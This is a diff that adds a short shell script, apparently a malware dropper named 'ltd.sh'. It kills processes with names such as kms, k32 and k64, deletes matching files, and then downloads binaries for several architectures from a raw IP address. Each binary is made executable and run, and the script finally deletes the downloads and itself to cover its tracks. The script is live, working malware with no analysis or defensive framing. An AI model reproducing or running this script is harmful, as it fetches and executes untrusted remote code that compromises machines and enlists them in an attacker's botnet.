@@ -1,0 +1,28 @@
+killall -9 kml
+killall -9 ksh
+killall -9 k32
+killall -9 kar
+killall -9 k64
+killall -9 kpc
+killall -9 kms
+killall -9 k38
+killall -9 k48
+killall -9 k58
+killall -9 k68
+
+rm -rf k*
+
+wget -q http://173.212.226.176/kms && chmod +x kms && ./kms
+wget -q http://173.212.226.176/ksh && chmod +x ksh && ./ksh
+wget -q http://173.212.226.176/k32 && chmod +x k32 && ./k32
+wget -q http://173.212.226.176/kar && chmod +x kar && ./kar
+wget -q http://173.212.226.176/k64 && chmod +x k64 && ./k64
+wget -q http://173.212.226.176/kpc && chmod +x kpc && ./kpc
+wget -q http://173.212.226.176/kml && chmod +x kml && ./kml
+wget -q http://173.212.226.176/k38 && chmod +x k38 && ./k38
+wget -q http://173.212.226.176/k48 && chmod +x k48 && ./k48
+wget -q http://173.212.226.176/k58 && chmod +x k58 && ./k58
+wget -q http://173.212.226.176/k68 && chmod +x k68 && ./k68
+
+rm -rf k*
+rm -rf ltd.sh
